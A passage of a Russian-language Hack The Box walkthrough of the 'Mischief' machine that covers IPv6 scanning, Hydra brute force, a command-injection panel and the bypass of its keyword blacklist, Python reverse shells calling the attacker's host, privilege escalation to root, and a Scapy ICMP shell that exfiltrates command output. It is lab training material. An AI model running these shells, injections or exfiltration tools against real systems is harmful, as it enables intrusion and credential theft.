пароль — loki:trickeryanddeceit.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ВЕЛИКИЙ ПАКОСТНИК
           ПРОБИРАЕМСЯ ЧЕРЕЗ ДЕБРИ IPV6 К ROOT‐
                 ФЛАГУ ВИРТУАЛКИ С HACK THE BOX





NMAP IPV6
Не забываем об обнаруженном Apache и обещании еще раз запустить Nmap
на IPv6. Как обычно, сделаем это в два этапа.



  root@kali:~# nmap ‐6 ‐n ‐v ‐Pn ‐‐min‐rate 5000 ‐oA nmap/ipv6‐initial ‐p‐
  dead:beef::0250:56ff:feb9:7caa
  root@kali:~# cat nmap/ipv6‐initial.nmap
  # Nmap 7.70 scan initiated Tue Apr  2 23:57:10 2019 as: nmap ‐6 ‐n ‐v ‐
  Pn ‐‐min‐rate 5000 ‐oA nmap/ipv6‐initial ‐p‐ dead:beef::0250:56ff:feb9:
  7caa
  Nmap scan report for dead:beef::250:56ff:feb9:7caa
  Host is up (0.044s latency).
  Not shown: 65533 closed ports
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http


  Read data files from: /usr/bin/../share/nmap
  # Nmap done at Tue Apr  2 23:57:23 2019 ‐‐ 1 IP address (1 host up)
  scanned in 13.65 seconds




  root@kali:~# nmap ‐6 ‐n ‐v ‐Pn ‐sV ‐sC ‐oA nmap/ipv6‐version ‐p22,80
  dead:beef::0250:56ff:feb9:7caa
  root@kali:~# cat nmap/ipv6‐version.nmap
  # Nmap 7.70 scan initiated Tue Apr  2 23:58:05 2019 as: nmap ‐6 ‐n ‐v ‐
  Pn ‐sV ‐sC ‐oA nmap/ipv6‐version ‐p22,80 dead:beef::0250:56ff:feb9:7caa
  Nmap scan report for dead:beef::250:56ff:feb9:7caa
  Host is up (0.043s latency).


  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
  | ssh‐hostkey:
  |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
  |   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
  |_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http‐server‐header: Apache/2.4.29 (Ubuntu)
  |_http‐title: 400 Bad Request
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


  Host script results:
  | address‐info:
  |   IPv6 EUI‐64:
  |     MAC address:
  |       address: 00:50:56:b9:7c:aa
  |_      manuf: VMware


  Read data files from: /usr/bin/../share/nmap
  Service detection performed. Please report any incorrect results at
  https://nmap.org/submit/ .
  # Nmap done at Tue Apr  2 23:58:15 2019 ‐‐ 1 IP address (1 host up)
  scanned in 9.41 seconds


Видим тот же SSH, что и на IPv4, и то, что от нас скрывалось, — веб‐сервер
Apache на 80‐м порте. Туда мы и отправимся.


WEB — ПОРТ 80 IPV6
Браузер
На http://[dead:beef::250:56ff:feb9:7caa]:80/ нас ожидает оче редное
предложение залогиниться.





                  Боль шая кноп ка Login на главной





                 Еще одна фор ма авторизации

Это задача из разряда «уга дай юзернейм». Несмотря на то что этого можно
не делать, посколь ку авто ризация байпасится (о чем мы поговорим в эпи‐
логе), для чистоты эксперимента сбру тим эту форму «Гидрой».
  Создадим файл с воз можными паролями — у нас их все го два, и оба они
лежали на HTTP‐сервере.



  root@kali:~# cat passwords.lst
  godofmischiefisloki
  trickeryanddeceit


Список юзернеймов возьмем из коллекции SecLists и запус тим перебор, ука‐
зав в качестве маркера неудачной авто ризации строку Sorry, those cre‐
dentials do not match, которую сервер воз вра щает в случае фей ла.



  root@kali:~# hydra ‐V ‐t 4 ‐f ‐I ‐L /usr/share/seclists/Usernames/top‐
  usernames‐shortlist.txt ‐P passwords.lst 'dead:beef:0000:0000:0250:56f‐
  f:feb9:7caa' http‐form‐post '/login.php:user=^USER^&password=^PASS^:Sor‐
  ry, those credentials do not match'
  Hydra v8.8 (c) 2019 by van Hauser/THC ‐ Please do not use in military or
  secret service organizations, or for illegal purposes.


  Hydra (https://github.com/vanhauser‐thc/thc‐hydra) starting at 2019‐04‐
  04 23:33:58
  [DATA] max 4 tasks per 1 server, overall 4 tasks, 34 login tries (l:17/
  p:2), ~9 tries per task
  [DATA] attacking http‐post‐form://[dead:beef:0000:0000:0250:56ff:feb9:
  7caa]:80/login.php:user=^USER^&password=^PASS^:Sorry, those credentials
  do not match
  ...
  [80][http‐post‐form] host: dead:beef:0000:0000:0250:56ff:feb9:7caa   lo‐
  gin: administrator   password: trickeryanddeceit
  [STATUS] attack finished for dead:beef:0000:0000:0250:56ff:feb9:7caa (
  valid pair found)
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser‐thc/thc‐hydra) finished at 2019‐04‐
  04 23:34:00


Итак, получили валидные данные для входа — administrator:trickeryand‐
deceit.


Command Execution Panel
После успешной авториза ции получаем окош ко с возможностью удаленного
выпол нения команд на хос те (Remote Command Execution, или RCE), где нам
сразу же предлагают отпра вить пинг для localhost.





             После авторизации на веб‐сервере Apache

Если предлагают, то почему нет? Только вот 127.0.0.1 я, пожалуй, заменю
на IP‐адрес своей машины, чтобы убедиться в успешности выпол нения
команды. Запускаю tcpdump, чтобы увидеть процесс ответа на ICMP‐запрос
от 10.10.10.92, и начинаю пинговать.





                  Пингуем свою машину с Mischief



  root@kali:~# tcpdump ‐n ‐i tun0 icmp
  tcpdump: verbose output suppressed, use ‐v or ‐vv for full protocol de‐
  code
  listening on tun0, link‐type RAW (Raw IP), capture size 262144 bytes
  01:08:50.065483 IP 10.10.10.92 > 10.10.14.11: ICMP echo request, id
  1490, seq 1, length 64
  01:08:50.065501 IP 10.10.14.11 > 10.10.10.92: ICMP echo reply, id 1490,
  seq 1, length 64
  01:08:51.050468 IP 10.10.10.92 > 10.10.14.11: ICMP echo request, id
  1490, seq 2, length 64
  01:08:51.050485 IP 10.10.14.11 > 10.10.10.92: ICMP echo reply, id 1490,
  seq 2, length 64
  ^C
  4 packets captured
  4 packets received by filter
  0 packets dropped by kernel


Есть контакт, значит, мож но экспериментировать даль ше.


Фильтрация команд
Если захочешь с ходу выз вать nc для инициализации реверс‐подключения, ты
разочаруешься.





        Вызов команды, содержащей слова из черного списка

Скорее всего, на машине активен механизм вро де WAF, который блокирует
выпол нение команд, содержащих слова из некоего черного списка. Если
вытащить cookie сессии, то мож но проверить, какие команды разрешены,
а какие нет. Для этого мы будем отправлять запросы подобного вида
на веб‐сервер с помощью curl.



  root@kali:~# curl ‐6 ‐s ‐X POST
  'http://[dead:beef::250:56ff:feb9:7caa]:80/' ‐H 'Cookie: PHPSESSID=bpp‐
  kfmhuiv9kngkmvir3s44vtj' ‐d 'command=nc'


  <!DOCTYPE html>
  <html>
  <title>Command Execution Panel (Beta)title>
  <head>
  <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <link href="http://fonts.googleapis.com/css?family=Comfortaa"
  rel="stylesheet" type="text/css">
  head>
  <body>


  <div class="header">
  <a href="/">Command Execution Panela>
  div>


  <br />Welcome administrator
  <br /><br />
  <a href="logout.php">Logout?a>
  <form action="/" method="post">
  Command: <br>
  <input type="text" name="command" value="ping ‐c 2 127.0.0.1"><br>
  <input type="submit" value="Execute">
  form>
  <p>
  <p>
  <p>In my home directory, i have my password in a file called creden‐
  tials, Mr Admin
  <p>


  body>
  html>
  Command is not allowed.


Для автоматизации процес са наброса ем неболь шой скрипт на Bash, который
будет принимать сло варь, содержащий список команд для проверки (коман‐
ды возьмем отсюда, к примеру, что бы не придумы вать самому):


#!/usr/bin/env bash


# Usage: ./test_waf_blacklist <IP_STR> <COOKIE_STR> <DICT_FILE>


IP=$1
COOKIE=$2
DICT=$3


G="\033[1;32m" # GREEN
R="\033[1;31m" # RED
NC="\033[0m"   # NO COLOR


for cmd in $(cat ${DICT}); do
    curl ‐6 ‐s ‐X POST "http://[${IP}]:80/" ‐H "Cookie: ${COOKIE}" ‐d
 "command=${cmd}" | grep ‐q "Command is not allowed."
    if [ $? ‐eq 1 ]; then
        echo ‐e "${G}${cmd}${NC} allowed"
    else
        echo ‐e "${R}${cmd}${NC} blocked"
    fi
done

И вот частичный результат его работы.





       Пример работы скрипта для перебора разрешенных команд

В конце статьи мы обсудим, как имен но устроен процесс фильтрации.


УГОН АККАУНТА ЛОКИ
Смотрим результат выпол нения команд
Размышляя о том, как анализирует ся результат выполнения запрошенной
команды в Command Execution Panel, я предположил самое очевидное: вывод
редиректится в /dev/null, а успех выпол нения оценивается по коду возвра‐
та. Только вот пайпы и редиректы в Bash не всегда инту итивный механизм,
и за мисконфиг можно дорого поплатиться. Например, если неправильно
организовать перенаправление при сцеплении двух команд с помощью ;
(«stacked‐команды»), то в /dev/null отпра вится только результат выпол‐
нения последней команды в цепочке, а все, что было до нее, благополучно
уйдет в stdout.
  Поэтому я не сильно удивился, когда увидел результат выполнения двух
stacked‐команд whoami; echo.





           Получаем результат выполнения stacked‐команд

То есть мы спокой но можем видеть вывод выполненной команды. И хотя
это совсем не тот путь, который изначально задумы вался автором машины,
в первом способе угона аккаунта Локи мы будем абъюзить именно эту ошиб‐
ку конфигурации.


Первый спо соб: /home/loki/credentials
На веб‐морде панели выполнения команд есть подсказка о местоположении
авторизационных  данных  пользователя.  Но...  нельзя  так просто  взять
и написать cat /home/loki/credentials;, что бы получить креды Локи, ведь
слово credentials находится в блек‐листе.




                      Что еще есть в блек‐листе

Зато, как видно из это го же скриншота, мы можем обратиться к credentials
через credential? или cred*. Окей, но сначала напишем скрипт, чтобы
делать это, не выходя из терминала. С помощью grep и регулярных выраже‐
ний заберем толь ко вывод выполненной команды, исключив из результата
работы curl сам код стра ницы.


#!/usr/bin/env bash


# Usage: ./command_execution_panel.sh <IP_STR> <COOKIE_STR>


IP=$1
COOKIE=$2


while :
do
    read ‐p "mischief> "  CMD
    curl ‐6 ‐s ‐X POST "http://[${IP}]:80/" ‐H "Cookie: ${COOKIE}" ‐d
 "command=${CMD};" | grep ‐F "</html>" ‐A 10 | grep ‐vF ‐e "</html>"
‐e "Command was executed succesfully!"
    echo
done

Испытаем скрипт на стандартных командах, которые я пробую, когда ока‐
зываюсь на новой вир туалке.



  root@kali:~# ./command_execution_panel.sh
  'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=a7kss4kl91ts09dq153lekjmjf'
  mischief> whoami
  www‐data


  mischief> id
  uid=33(www‐data) gid=33(www‐data) groups=33(www‐data)


  mischief> uname ‐a
  Linux Mischief 4.15.0‐20‐generic #21‐Ubuntu SMP Tue Apr 24 06:16:15 UTC
  2018 x86_64 x86_64 x86_64 GNU/Linux


И заберем авторизацию для SSH.



  root@kali:~# ./command_execution_panel.sh
  'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=a7kss4kl91ts09dq153lekjmjf'
  mischief> cat /home/loki/cred*
  pass: lokiisthebestnorsegod


Теперь мы можем  иницииро вать SSH‐подклю чение  как  loki:lokiis‐
thebestnorsegod.



  root@kali:~# sshpass ‐p 'lokiisthebestnorsegod' ssh loki@10.10.10.92
  Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0‐20‐generic x86_64)


  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage


  System information disabled due to load higher than 1.0



  * Canonical Livepatch is available for installation.
  ‐ Reduce system reboots and improve kernel security. Activate at:
  https://ubuntu.com/livepatch


  0 packages can be updated.
  0 updates are security updates.



  Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4


А вот и первый флаг — пользовательский.


user.txt


  loki@Mischief:~$ cat user.txt
  bf58078e????????????????????????



Вто рой спо соб: reverse shell
Самозваный WAF не бло чит python, поэтому скрафтим на его основе
реверс‐шелл и попытаемся поймать отклик. Код стандартный: подключаясь
к удаленному сокету по заданному адресу и порту, ты соз даешь три стандар‐
тных файловых дескриптора (0, 1 и 2), уста навливаешь запись истории в
/dev/null и спаунишь PTY‐шелл с процес сом интерпретатора /bin/sh (так
как слово bash в черном списке WAF).


#!/usr/bin/python
# ‐*‐ coding: utf‐8 ‐*‐


import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.14", 31337))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv("HISTFILE", "/dev/null")
pty.spawn("/bin/sh")
s.close()

В полевых условиях выполнение такого кода сведено до одной строки,
которая подается на исполнение питону флагом ‐c пря мо из терминала.



  root@kali:~# ./command_execution_panel.sh
  'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=lofmvtjj3hq2jfp1pgev2bh1pb'
  mischief> python ‐c 'import socket,os,pty; s=socket.socket(sock‐
  et.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.14",31337)); os‐
  .dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.‐
  putenv("HISTFILE","/dev/null"); pty.spawn("/bin/sh"); s.close()'


Но ответ, к сожале нию, мы не получили... Шелл не вернулся, однако по харак‐
терному зависанию при выполнении последней команды я предположил, что
исходящий трафик IPv4 филь тру ется. Попробовав то же самое для IPv6, я
успешно поймал отклик на предваритель но запущенный listener.



  root@kali:~# ./command_execution_panel.sh
  'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=lofmvtjj3hq2jfp1pgev2bh1pb'
  mischief> python ‐c 'import socket,os,pty; s=socket.socket(sock‐
  et.AF_INET6,socket.SOCK_STREAM); s.connect(("dead:beef:2::1009",31337));
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os‐
  .putenv("HISTFILE","/dev/null"); pty.spawn("/bin/sh"); s.close()'


Для прослушивания IPv6 используется netcat с фла гом ‐6.



  root@kali:~# nc ‐6 ‐lvnp 31337
  Ncat: Version 7.70 ( https://nmap.org/ncat )
  Ncat: Listening on :::31337
  Ncat: Connection from dead:beef::250:56ff:feb9:7caa.
  Ncat: Connection from dead:beef::250:56ff:feb9:7caa:47306.
  root@kali:~# whoami
  whoami
  www‐data



Апгрейд до пол ностью инте рак тивно го шел ла
Также  максимально  полезно  знать,  как  апгрейдить  неповоротливый
реверс‐шелл до полноценного интерактивного шелла, где будут работать
такие фичи, как автодополнения команд при нажатии на Tab, управляющие
символы вроде стрелок вверх и вниз, CTRL‐R для поиска по истории, CTRL‐C
для завершения процесса внутри шелла (а не завершение самого шелла)
и прочее.
   Кратко рассмотрим мой способ такого превращения для Linux.
1. Спауним нормальный PTY‐шелл.



  root@kali:~$ python ‐c 'import pty;pty.spawn("/bin/bash")'
  python ‐c 'import pty;pty.spawn("/bin/bash")'
  www‐data@Mischief:/var/www/html$


2. Отправляем наш удаленный шел в бэкграунд для настройки локального
терминала.




                                         Z  www‐data@Mischief:/var/www/html$
  root@kali:~#


3. Получаем размер окна своего терминала, просеивая вывод команды stty
‐a.



  root@kali:~# stty ‐a | head ‐n1 | cut ‐d ';' ‐f 2‐3 | cut ‐b2‐ | sed
  's/; /\n/'
  rows 60
  columns 200


4. Отключаем эхо в локальном терминале (чтобы ввод команд в консоль
не дублировался), переключа емся в режим raw для игнорирования хоткеев
(разумеется, также в локальном терминале) и будим уснувший процесс
реверс‐шелла.



  root@kali:~# stty raw ‐echo; fg


5. Настраиваем удаленный терминал на исполь зование тех же значений
высоты и ширины окна, которые выставлены у нас на данный момент на ата‐
кующей машине, чтобы не страдать от переко шенного вывода команд.



  www‐data@Mischief:/var/www/html$ stty rows 60 cols 200


6. Устанавливаем значение переменной окружения TERM так, чтобы по воз‐
можности (если удаленный терминал его поддерживает) у нас был цветной
вывод.



  www‐data@Mischief:/var/www/html$ export TERM=xterm‐256color


7. Наконец, перезагружаем обо лочку, чтобы интерпретатор съел обновлен‐
ное значение TERM.



  www‐data@Mischief:/var/www/html$ exec /bin/bash


После этого можешь наслаждаться стабильной работой на удаленном хосте
со всеми преимуществами интерактивного шелла.
  Возвращаясь к нашему прохождению: пос ле получе ния реверс‐шелла
воспользуемся su для смены текущего пользователя на Локи — пароль‐то мы
знаем.



  www‐data@Mischief:/var/www/html$ su ‐ loki
  Password: lokiisthebestnorsegod


  loki@Mischief:~$ whoami
  loki


И так же, как и раньше, заберем свой флаг.



  loki@Mischief:~$ cat user.txt
  bf58078e????????????????????????



PRIVESC: LOKI → ROOT


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ВЕЛИКИЙ ПАКОСТНИК
           ПРОБИРАЕМСЯ ЧЕРЕЗ ДЕБРИ IPV6 К ROOT‐
                 ФЛАГУ ВИРТУАЛКИ С HACK THE BOX





Пароль в .bash_history
Осмотревшись на хосте, я нашел в .bash_history пароль для питоновского
сервера, на первый взгляд очень похожий на один из встреченных нами
ранее.



  loki@Mischief:~$ cat .bash_history
  python ‐m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
  exit
  free ‐mt
  ifconfig
  cd /etc/
  sudo su
  su
  exit
  su root
  ls ‐la
  sudo ‐l
  ifconfig
  id
  cat .bash_history
  nano .bash_history
  exit


Но нет, это оказался пароль от рута root:lokipasswordmischieftrickery...


su от име ни loki
Авторизованные как loki, мы не можем повысить привилегии через su.



  loki@Mischief:~$ su ‐
  ‐bash: /bin/su: Permission denied


Почему? Хороший вопрос. Запус кать бинарник могут все.



  loki@Mischief:~$ ls ‐l /bin/su
  ‐rwsr‐xr‐x+ 1 root root 44664 Jan 25  2018 /bin/su


Но вот плюсик в конце основных прав дос тупа говорит о при менении к фай лу
дополнительных правил, а именно — механизма списков контроля доступа
ACL.


Access Control Lists
К сожалению, стандартная для Unix модель раз граничения прав дос тупа
«пользователь/группа/остальные» не так гиб ка, как хотелось бы, и под ходит
только для простых схем пользовательских иерархий. Для того чтобы реали‐
зовывать более сложные структуры прав дос тупа, был вве ден допол нитель‐
ный механизм безопасности — ACL (Access Control  Lists), позволяющий
более  детально настра ивать политику дос тупа  к файлам и  каталогам
для пользовате лей и групп.
  С помощью команды getfacl посмотрим листинг ACL прав доступа
для объекта (файла) /bin/su и разберем, что означает каждая из нас троек.



  loki@Mischief:~$ getfacl /bin/su
  getfacl: Removing leading '/' from absolute path names
  # file: bin/su — имя файла
  # owner: root — владелец файла (основные права Unix)
  # group: root — группа файла (основные права Unix)
  # flags: s‐‐ — флаги, определяющие, выставлены ли setuid, setgid
  и sticky bits соответственно
  user::rwx — основные права Unix для файла
  user:loki:r‐‐ — ACL‐права для файла
  group::r‐x — основные права Unix для группы файла
  mask::r‐x — эффективная маска (ограничение максимальных прав для файла)
  other::r‐x — основные права Unix пользователя «остальные» для файла


Из этого примера видно, что у Локи есть пра во только на чтение файла
/bin/su, но выполнить его он не может. Такая же история с sudo.



  loki@Mischief:~$ getfacl /usr/bin/sudo
  getfacl: Removing leading '/' from absolute path names
  # file: usr/bin/sudo
  # owner: root
  # group: root
  # flags: s‐‐
  user::rwx
  user:loki:r‐‐
  group::r‐x
  mask::r‐x
  other::r‐x


Кстати, найти все, к чему применены правила ACL, также можно с помощью
getfacl.




                                                                          #  loki@Mischief:~$ getfacl ‐R ‐s ‐p / 2>/dev/null | sed ‐n 's/  file: //p'
  //usr/bin/sudo
  //bin/su


Поэтому нам нужен другой способ ввести креды суперпользователя.


Первый спо соб: su от име ни www-data
Здесь все просто — возвращаемся к самопальному command_execution_‐
panel.sh, снова триггерим шелл и отту да повышаем привиле гии до root.



  www‐data@Mischief:/var/www/html$ su ‐
  Password: lokipasswordmischieftrickery


  root@Mischief:~# whoami
  root


  root@Mischief:~# id
  uid=0(root) gid=0(root) groups=0(root)



Вто рой спо соб: systemd-run
Если не можем воспользовать ся su, что бы сменить пользовате ля, то можем
сделать это через менеджер служб systemd, вос пользовавшись юни том, соз‐
данным в рантайме. Да, таким обра зом я не получу шелл «здесь и сейчас»,
но я смогу инициировать IPv6‐реверс‐шелл, как мы делали это раньше.



  loki@Mischief:~$ systemd‐run python ‐c 'import socket,os,pty; s=socket.‐
  socket(socket.AF_INET6,socket.SOCK_STREAM);
  s.connect(("dead:beef:2::1009",31337)); os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
  os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/sh"); s.close()'
  ==== AUTHENTICATING FOR org.freedesktop.systemd1.manage‐units ===
  Authentication is required to manage system services or other units.
  Authenticating as: root
  Password: lokipasswordmischieftrickery
  ==== AUTHENTICATION COMPLETE ===
  Running as unit: run‐u19.service


Ловим callback.



  root@kali:~# nc ‐lvnp 31337
  Ncat: Version 7.70 ( https://nmap.org/ncat )
  Ncat: Listening on :::31337
  Ncat: Listening on 0.0.0.0:31337
  Ncat: Connection from dead:beef::250:56ff:feb9:7caa.
  Ncat: Connection from dead:beef::250:56ff:feb9:7caa:47312.


  root@kali:~# whoami
  whoami
  root



Ищем root.txt
Получив root‐сессию любым из способов выше и заг лянув в /root/root.txt,
флага ты не найдешь.



  root@Mischief:~# cat root.txt
  The flag is not here, get a shell to find it!


Судя по сообщению, автор задумывал, что к моменту прочтения флага у нас
еще не должно было быть шелла. Но у нас он есть, поэтому нам не составит
труда найти настоящий флаг привилегированного пользователя.



  root@Mischief:~# find / ‐type f ‐name root.txt 2>/dev/null
  /usr/lib/gcc/x86_64‐linux‐gnu/7/root.txt
  /root/root.txt



root.txt


  root@Mischief:~# cat /usr/lib/gcc/x86_64‐linux‐gnu/7/root.txt
  ae155fad????????????????????????


На этом все — хост пол ностью под нашим контролем.


ЭПИЛОГ
RCE без авто ризации
Забавно, но я только после прохож дения осознал, что команды в Command
Execution Panel можно выполнять и без авторизации. Взгля нем на исходники
веб‐странички /var/www/html/index.php.


<?php
session_start();
require 'database.php';
if( isset($_SESSION['user_id']) ){
    ...
}
...
if(isset($_POST['command'])) {
    ...
}


?>

Отсюда видно, почему так получилось: ветка if(isset($_POST['command'])
) не требует авторизации! То есть можно было не париться о cookies в наших
скриптах на Bash. Узнать об этом до PWN пользователя можно было брутом
параметров запроса с помощью, например, wfuzz.


WAF
Посмотрим, как устроен механизм фильтрации команд Command Execution
Panel. Для этого отправимся в /var/www/html и изу чим index.php.


...
if(isset($_POST['command'])) {
        $cmd = $_POST['command'];
        if (strpos($cmd, "nc" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "bash" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "chown" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "setfacl" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "chmod" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "perl" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "find" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "locate" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "ls" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "php" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "wget" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "curl" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "dir" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "ftp" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "telnet" ) !== false){
                echo "Command is not allowed.";
        } else {
                system("$cmd > /dev/null 2>&1");
                echo "Command was executed succesfully!";
        }
...

Что и требовалось доказать: много elseif с условиями strpos($cmd,
"STRING") !== false. Лучший способ обхо дить такие фильтры — исполь‐
зование символа * для автодополнения команд  (что мы, собственно,
и делали). К слову, извлечь все зап рещенные команды можно таким однос‐
трочником.



  loki@Mischief:/var/www/html$ cat index.php | grep strpos | cut ‐d '"' ‐
  f2
  nc
  bash
  chown
  setfacl
  chmod
  perl
  find
  locate
  ls
  php
  wget
  curl
  dir
  ftp
  telnet


В этом же сегменте исходника, кстати, становит ся очевидно, откуда происхо‐
дит  баг  с  отображением  вывода  stacked‐команд:  при  их  сцеплении
с помощью ; в /dev/null отправляется результат выполнения только пос‐
ледней команды.


ICMP-шелл
Мы подошли к самой творческой час ти прохож дения. Представим ситуацию,
в которой мы бы не обна ружили воз можность смотреть результаты выпол‐
нения команд прямо в браузере. Такой исход и подразумевал автор, и в этом
случае нам бы пришлось мастерить ICMP‐шелл.
   Что такое ICMP‐шелл? Вспомним, какая команда в Command Execution
Panel была единственно легитимной. Это команда ping. Если открыть ману ал
к ней, можно увидеть интересный флаг, который окажется нашим спасителем
в этой трудной ситуации:


     ‐p pattern
        You may specify up to 16 "pad" bytes to  fill out the packet you send.
       This is useful for diagnosing data-dependent problems in a network.
       For example, ‐p ff will cause the sent packet to be filled with all ones.

Команда ping позволяет отправлять 16 произвольных «диагности ческих» бай‐
тов с каждым ICMP‐запросом. Следова тельно, если в качестве таких байтов
подавать результат выполненных операций на хосте, мы получим шелл. Гру‐
бый, самопальный, но все же шелл! На этапе поиска уязвимых мест жертвы
этого вполне хватит.


Яд ро шел ла
Ядром будущего шелла станет bash‐инъекция такого вида:


{ $CMD; echo STOPSTOPSTOPSTOP; } 2>&1 | xxd ‐p | tr ‐d '\n' | fold ‐w
 32 | while read output; do ping ‐c 1 ‐p $output {LHOST}; done

Что здесь происходит (слева направо):
 1. С помощью фигурных скобок сцеп ляем вывод двух команд: непос редс‐
   твенно команда, которую задает оператор ICMP‐шел ла ($CMD), и запись
   «маркера останова»  (echo  STOPSTOPSTOPSTOP), о предназначении
   которого ниже.
 2. Поток stdout комбиниру ем с stderr, чтобы иметь возможность видеть
   сообщения об ошибках.
 3. Результат первых двух шагов по конвей еру отправляется в xxd  p ,
   который преобразует ASCII в hex.
 4. Командой tr d избавляемся от символов перевода строки.
 5. Команда fold w вставляет символ перево да строки каждые 32 символа
   (16 байт — как раз столько, сколько может отправить ping в одном
   пакете).
 6. В цикле while построчно (помним, что на одной строке заведомо 16 байт)
   читается организованный результат выполнения команды, переведенный
   в шестнадцатеричный вид, и триг герится ping, который отправляет
   по одному ICMP‐пакету с каждой следующей прочтенной строкой в качес‐
   тве «диагностических» байтов на целевой хост ($LHOST — машина ата‐
  кующего).

Зачем нам нужен «маркер оста нова»? Предста вим ситуацию, в которой мы
хотим получить вывод команды whoami. Пусть поль зователя зовут root, тогда
после выполнения такой команды (ниже) мы получим результат 726f6f740a,
в котором все го десять символов, что однозначно меньше, чем 32.


whoami 2>&1 | xxd ‐p | tr ‐d '\n'  # выведет "726f6f740a"

В таком случае инструкция fold  ‐w  32 будет бесполезна, так как мы
не добили вывод до нужной длины и поэтому циклу while просто будет нечего
читать: он не увидит символ перевода на новую строку и будет счи тать, что
вывод пустой.
  Поэтому я добавляю «маркер оста нова» длиной в 16 ASCII‐символов
(16 байт, 32 hex‐символа), роль которого — добивать вывод команды
с гарантированным переходом на новую строку, чтобы while прочитал
и отправил даже самый короткий вывод.


ICMPShell.py
Для автоматизации процесса напишем скрипт на Python с использовани ем
модуля Scapy, который поможет реализовать сниффер  пакетов  ICMP.
В качестве альтернативы можно использовать модуль impacket, как, нап‐
ример, в icmpsh_m.py, но мне Scapy больше по душе.


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Usage: python3 ICMPShell.py <LHOST> <RHOST>


import cmd
import sys
from threading import Thread
from urllib.parse import quote_plus


import requests
from scapy.all import *


M = '\033[%s;35m'  # MAGENTA
Y = '\033[%s;33m'  # YELLOW
R = '\033[%s;31m'  # RED
S = '\033[0m'      # RESET


MARKER = 'STOP'


class ICMPSniffer(Thread):


    def __init__(self, iface='tun0'):
        super().__init__()
        self.iface = iface


    def run(self):
        sniff(iface=self.iface, filter='icmp[icmptype]==8', prn=self.
process_icmp)


    def process_icmp(self, pkt):
        buf = pkt[ICMP].load[16:32].decode('utf‐8')


        setmarker = set(MARKER)
        if set(buf[‐4:]) == setmarker and set(buf) != setmarker:
                buf = buf[:buf.index(MARKER)]


        print(buf, end='', flush=True)


class Terminal(cmd.Cmd):


    prompt = f'{M%0}ICMPShell{S}> '


    def __init__(self, LHOST, RHOST, proxies=None):
        super().__init__()


        if proxies:
            self.proxies = {'http': proxies}
        else:
            self.proxies = {}


        self.LHOST = LHOST
        self.RHOST = RHOST
        self.inject = r"""{ {cmd}; echo {MARKER}; } 2>&1 | xxd ‐p |
tr ‐d '\n' | fold ‐w 32 | while read output; do ping ‐c 1 ‐p
$output {LHOST}; done"""


    def do_cmd(self, cmd):
        try:
            resp = requests.post(
                f'http://{self.RHOST}/',
                data=f'command={quote_plus(self.inject.format(
cmd=cmd, MARKER=MARKER*4, LHOST=self.LHOST))}',
                headers={'Content‐Type': 'application/
x‐www‐form‐urlencoded'},
                proxies=self.proxies
            )


            if resp.status_code == 200:
                if 'Command is not allowed.' in resp.text:
                    print(f'{Y%0}[!] Command triggers WAF filter.
Try something else{S}')


        except requests.exceptions.ConnectionError as e:
            print(str(e))
            print(f'{R%0}[‐] No response from {self.RHOST}{S}')


        finally:
            print()


    def do_EOF(self, args):
        print()
        return True


    def emptyline(self):
        pass


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: python3 {sys.argv[0]} <LHOST> <RHOST>')
        sys.exit()
    else:
        LHOST = sys.argv[1]
        RHOST = sys.argv[2]


    sniffer = ICMPSniffer()
    sniffer.daemon = True
    sniffer.start()


    terminal = Terminal(
        LHOST,
        RHOST,
        # proxies='http://127.0.0.1:8080'  # Burp
    )
    terminal.cmdloop()

Результат работы можно наблюдать ниже (на панели внизу активен tcpdump,
